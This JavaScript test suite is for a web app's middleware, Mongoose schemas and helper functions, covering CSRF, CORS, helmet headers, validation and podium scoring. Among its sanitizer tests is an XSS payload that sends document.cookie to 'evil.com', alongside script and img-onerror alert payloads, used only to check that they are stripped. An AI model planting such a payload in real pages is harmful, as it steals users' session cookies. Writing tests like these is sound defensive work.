/**
 * Test suite. Run it with:  npm test
 *
 * It needs no database connection, which is the point: everything it checks
 * is either the middleware chain over real HTTP, a Mongoose schema rule
 * (validateSync and validate() both run without a connection), or a pure
 * function. That makes it fast and makes it run anywhere.
 *
 * What it does NOT cover is the controllers' own database calls — creating a
 * post and reading it back. Those need a live MongoDB; run the app against
 * one and click through it.
 *
 * Original description:
 * Test suite that needs no database connection.
 *
 * Covers: the middleware chain over real HTTP, Mongoose schema validation via
 * validateSync(), and the pure functions. The only thing it cannot reach is a
 * controller's own database calls.
 */
process.env.NODE_ENV = 'test'
process.env.JWT_SECRET = 'test-secret'
process.env.CLIENT_ORIGIN = 'http://localhost:5173'

const S = new URL('../src', import.meta.url).pathname
const { default: app } = await import(`${S}/app.js`)

const server = app.listen(4100)
const BASE = 'http://localhost:4100'

let pass = 0, fail = 0
const failures = []
function check(label, actual, expected) {
  const ok = actual === expected
  if (ok) pass++; else { fail++; failures.push(`${label}: got ${actual}, want ${expected}`) }
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${label}${ok ? '' : `  (got ${actual}, want ${expected})`}`)
}
function assert(label, cond, detail = '') {
  if (cond) pass++; else { fail++; failures.push(`${label} ${detail}`) }
  console.log(`${cond ? 'ok  ' : 'FAIL'} ${label}${cond ? '' : `  ${detail}`}`)
}

const jar = new Map()
let csrf = null
async function call(method, path, body, extraHeaders = {}) {
  const headers = { Origin: 'http://localhost:5173', ...extraHeaders }
  if (jar.size) headers.Cookie = [...jar].map(([k, v]) => `${k}=${v}`).join('; ')
  if (body !== undefined) headers['Content-Type'] = 'application/json'
  if (csrf) headers['X-CSRF-Token'] = csrf
  Object.assign(headers, extraHeaders)
  const res = await fetch(BASE + path, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) })
  for (const raw of res.headers.getSetCookie?.() ?? []) {
    const [pair] = raw.split(';'); const i = pair.indexOf('=')
    jar.set(pair.slice(0, i).trim(), pair.slice(i + 1).trim())
  }
  let json = null
  try { json = await res.json() } catch {}
  return { status: res.status, body: json, headers: res.headers }
}

/* ============ A. the middleware chain ============ */
console.log('\n=== A. middleware chain (real HTTP) ===')

const health = await call('GET', '/api/health')
check('GET /api/health', health.status, 200)

assert('helmet: X-Content-Type-Options', health.headers.get('x-content-type-options') === 'nosniff')
assert('helmet: Content-Security-Policy', Boolean(health.headers.get('content-security-policy')))
assert('helmet: HSTS off outside production', health.headers.get('strict-transport-security') === null)
assert('CORS: allows the configured origin', health.headers.get('access-control-allow-origin') === 'http://localhost:5173')
assert('CORS: allows credentials', health.headers.get('access-control-allow-credentials') === 'true')
assert('CORS: never a wildcard', health.headers.get('access-control-allow-origin') !== '*')

const forged = await call('POST', '/api/auth/register', { email: 'a@b.co', username: 'x', password: 'password123' })
check('CSRF: write refused without a token', forged.status, 403)
assert('CSRF: says why', forged.body?.reason === 'csrf', JSON.stringify(forged.body))

const t = await call('GET', '/api/csrf-token')
csrf = t.body?.csrfToken
assert('CSRF: token issued', typeof csrf === 'string' && csrf.length === 64, String(csrf))
assert('CSRF: cookie set and readable by JS', jar.has('csrfToken'))

const mismatch = await call('POST', '/api/auth/login', { email: 'a@b.co', password: 'x' }, { 'X-CSRF-Token': 'f'.repeat(64) })
check('CSRF: mismatched token refused', mismatch.status, 403)

console.log('\n--- validation level 2: before any model is touched ---')
const badEmail = await call('POST', '/api/auth/register', { email: 'nope', username: 'zainab', password: 'password123' })
check('bad email', badEmail.status, 400)
assert('  per-field message', badEmail.body?.fields?.email === 'Enter a valid email address', JSON.stringify(badEmail.body))

const shortPw = await call('POST', '/api/auth/register', { email: 'z@e.com', username: 'zainab', password: 'short' })
check('short password', shortPw.status, 400)
assert('  names the field', shortPw.body?.fields?.password === 'Use at least 8 characters')

const badUser = await call('POST', '/api/auth/register', { email: 'z@e.com', username: 'bad name!', password: 'password123' })
check('username charset', badUser.status, 400)

const blank = await call('POST', '/api/auth/register', {})
check('all blank', blank.status, 400)
assert('  reports every missing field at once', Object.keys(blank.body?.fields ?? {}).length === 3, JSON.stringify(blank.body?.fields))

const badCode = await call('POST', '/api/auth/verify', { email: 'z@e.com', code: '12' })
check('six-digit code enforced', badCode.status, 400)

console.log('\n--- auth and authorisation gates ---')
check('POST /api/posts without a session', (await call('POST', '/api/posts', { body: 'hello' })).status, 401)
check('GET /api/reports without a session', (await call('GET', '/api/reports')).status, 401)
check('PATCH /api/profiles/me without a session', (await call('PATCH', '/api/profiles/me', { bio: 'x' })).status, 401)
check('GET /api/auth/me without a session', (await call('GET', '/api/auth/me')).status, 401)

console.log('\n--- bad input that never reaches Mongoose ---')
check('non-ObjectId post id', (await call('GET', '/api/posts/banana/comments')).status, 400)
check('unknown route', (await call('GET', '/api/nothing-here')).status, 404)

const bigBody = await fetch(BASE + '/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, Cookie: `csrfToken=${csrf}` },
  body: JSON.stringify({ email: 'a@b.co', password: 'x'.repeat(200000) }),
})
check('oversized body refused', bigBody.status, 413)

const badJson = await fetch(BASE + '/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf, Cookie: `csrfToken=${csrf}` },
  body: '{not json',
})
check('malformed JSON gives 400 not 500', badJson.status, 400)

server.close()

/* ============ B. schema validation, level 3 ============ */
console.log('\n=== B. Mongoose schema validation (no connection needed) ===')

const { default: User } = await import(`${S}/models/User.js`)
const { default: Post } = await import(`${S}/models/Post.js`)
const { default: Comment } = await import(`${S}/models/Comment.js`)
const { default: Meetup } = await import(`${S}/models/Meetup.js`)
const { default: Prediction } = await import(`${S}/models/Prediction.js`)
const { default: Report } = await import(`${S}/models/Report.js`)
const { default: Profile } = await import(`${S}/models/Profile.js`)
const { default: Community } = await import(`${S}/models/Community.js`)

const OID = '507f1f77bcf86cd799439011'
const soon = new Date(Date.now() + 86400000)

/** Runs full validation on a document and returns its error map. */
async function errsOf(doc) {
  const error = await doc.validate().then(() => null).catch((e) => e)
  return error?.errors ?? {}
}

/** Asserts the document is rejected, and that the named field is the reason. */
async function invalid(label, doc, field) {
  const errors = await errsOf(doc)
  const keys = Object.keys(errors)
  assert(label, keys.includes(field), `fields in error: [${keys.join(', ')}]`)
}

/** Asserts the document passes every rule. */
async function valid(label, doc) {
  const keys = Object.keys(await errsOf(doc))
  assert(label, keys.length === 0, `unexpected errors: [${keys.join(', ')}]`)
}

await invalid('User: email required', new User({ username: 'zainab', passwordHash: 'h' }), 'email')
await invalid('User: email format', new User({ email: 'nope', username: 'zainab', passwordHash: 'h' }), 'email')
await invalid('User: username min length', new User({ email: 'a@b.co', username: 'ab', passwordHash: 'h' }), 'username')
await invalid('User: username charset', new User({ email: 'a@b.co', username: 'bad name', passwordHash: 'h' }), 'username')
await invalid('User: role enum', new User({ email: 'a@b.co', username: 'zainab', passwordHash: 'h', role: 'owner' }), 'role')
await valid('User: a valid one passes', new User({ email: 'a@b.co', username: 'zainab', passwordHash: 'h' }))
assert('User: email lowercased and trimmed', new User({ email: '  Z@Example.COM ' }).email === 'z@example.com')

await invalid('Post: body min length', new Post({ author: OID, community: OID, body: 'x' }), 'body')
await invalid('Post: body max length', new Post({ author: OID, community: OID, body: 'x'.repeat(1001) }), 'body')
await invalid('Post: round out of range', new Post({ author: OID, raceRound: 99, body: 'a valid body' }), 'raceRound')
await invalid('Post: community AND race refused', new Post({ author: OID, community: OID, raceRound: 3, body: 'valid body' }), 'community')
await invalid('Post: neither community nor race refused', new Post({ author: OID, body: 'valid body' }), 'community')
await valid('Post: community only passes', new Post({ author: OID, community: OID, body: 'two stops or nothing' }))
await valid('Post: race room only passes', new Post({ author: OID, raceRound: 21, season: 2026, body: 'two stops or nothing' }))

await invalid('Comment: max length', new Comment({ post: OID, author: OID, body: 'x'.repeat(501) }), 'body')
await valid('Comment: a valid one passes', new Comment({ post: OID, author: OID, body: 'Agreed.' }))

await invalid('Meetup: location required', new Meetup({ title: 'Watch party', startsAt: soon, host: OID }), 'location')
await invalid('Meetup: start must be in the future', new Meetup({ title: 'Watch party', location: 'Lahore', startsAt: new Date('2020-01-01'), host: OID }), 'startsAt')
await invalid('Meetup: capacity range', new Meetup({ title: 'Watch party', location: 'Lahore', startsAt: soon, host: OID, capacity: 1 }), 'capacity')
await valid('Meetup: a valid one passes', new Meetup({ title: 'Watch party', location: 'Lahore', startsAt: soon, host: OID }))

const basePrediction = { user: OID, season: 2026, round: 21, raceName: 'Brazil' }
await invalid('Prediction: needs exactly three', new Prediction({ ...basePrediction, podium: ['a', 'b'] }), 'podium')
await invalid('Prediction: no duplicate drivers', new Prediction({ ...basePrediction, podium: ['a', 'a', 'b'] }), 'podium')
await invalid('Prediction: round range', new Prediction({ ...basePrediction, round: 99, podium: ['a', 'b', 'c'] }), 'round')
await valid('Prediction: a valid one passes', new Prediction({ ...basePrediction, podium: ['a', 'b', 'c'] }))

await invalid('Report: targetType enum', new Report({ targetType: 'spaceship', targetId: 'x', reporter: OID, reason: 'because' }), 'targetType')
await invalid('Report: reason min length', new Report({ targetType: 'post', targetId: 'x', reporter: OID, reason: 'ab' }), 'reason')

await invalid('Profile: bio max length', new Profile({ user: OID, username: 'zainab', bio: 'x'.repeat(201) }), 'bio')
await invalid('Profile: favourites capped at 60', new Profile({ user: OID, username: 'zainab', favouriteDrivers: Array.from({ length: 61 }, (_, i) => `d${i}`) }), 'favouriteDrivers')
await valid('Profile: a valid one passes', new Profile({ user: OID, username: 'zainab', bio: 'Strategy nerd.' }))

await invalid('Community: slug charset', new Community({ name: 'Strategy', slug: 'Not A Slug', creator: OID }), 'slug')
await invalid('Community: type enum', new Community({ name: 'Strategy', slug: 'strategy', creator: OID, type: 'banana' }), 'type')
await invalid('Community: name min length', new Community({ name: 'ab', slug: 'ab', creator: OID }), 'name')
await valid('Community: a valid one passes', new Community({ name: 'Strategy Nerds', slug: 'strategy-nerds', creator: OID }))

/* ============ C. pure functions ============ */
console.log('\n=== C. pure functions ===')

const { cleanText, escapeHtml } = await import(`${S}/middleware/sanitize.js`)
const { rule } = await import(`${S}/middleware/validate.js`)
const { scorePodium } = await import(`${S}/controllers/predictionController.js`)

assert('cleanText: strips a script tag and its contents',
  cleanText('<script>fetch("http://evil.com?c="+document.cookie)</script>Nice ride!') === 'Nice ride!',
  cleanText('<script>alert(1)</script>Nice ride!'))
assert('cleanText: strips img/onerror',
  cleanText('<img src=x onerror=alert(1)>hello') === 'hello',
  cleanText('<img src=x onerror=alert(1)>hello'))
assert('cleanText: strips formatting too', cleanText('<b>Hello</b>') === 'Hello', cleanText('<b>Hello</b>'))
assert('cleanText: leaves plain prose alone', cleanText('  Two stops or nothing.  ') === 'Two stops or nothing.')

assert('escapeHtml: all five characters',
  escapeHtml(`<script>"&'`) === '&lt;script&gt;&quot;&amp;&#39;'.replace('&amp;', '&amp;'),
  escapeHtml(`<script>"&'`))
assert('escapeHtml: the lecture example',
  escapeHtml('<script>alert(1)</script>') === '&lt;script&gt;alert(1)&lt;/script&gt;',
  escapeHtml('<script>alert(1)</script>'))

assert('rule.required rejects blank', rule.required('needed')('   ') === 'needed')
assert('rule.required passes a value', rule.required('needed')('x') === null)
assert('rule.maxLength measures trimmed', rule.maxLength(3)('  abcd  ') !== null)
assert('rule.email', rule.email()('a@b') !== null && rule.email()('a@b.co') === null)
assert('rule.oneOf', rule.oneOf(['a', 'b'])('c') !== null && rule.oneOf(['a', 'b'])('a') === null)
assert('rule.integer range', rule.integer({ min: 1, max: 3 })(4) !== null && rule.integer({ min: 1, max: 3 })(2) === null)
assert('rule.array unique', rule.array({ unique: true })(['a', 'a']) !== null)
assert('rule.matchesField', rule.matchesField('b')('x', { b: 'y' }) !== null && rule.matchesField('b')('x', { b: 'x' }) === null)
assert('optional rules skip blanks', rule.maxLength(3)(undefined) === null && rule.email()('') === null)

const perfect = scorePodium(['nor', 'lec', 'ver'], ['nor', 'lec', 'ver'], 'nor', 'nor')
assert('scorePodium: perfect = 30 + 5 pole', perfect.points === 35, String(perfect.points))
const shuffled = scorePodium(['nor', 'ver', 'lec'], ['nor', 'lec', 'ver'])
assert('scorePodium: 10 + 4 + 4 = 18', shuffled.points === 18, String(shuffled.points))
const miss = scorePodium(['ham', 'rus', 'alo'], ['nor', 'lec', 'ver'])
assert('scorePodium: all wrong = 0', miss.points === 0, String(miss.points))

console.log(`\n================  ${pass} passed, ${fail} failed  ================\n`)
if (failures.length) console.log('failures:\n  ' + failures.join('\n  '))
process.exit(fail ? 1 : 0)
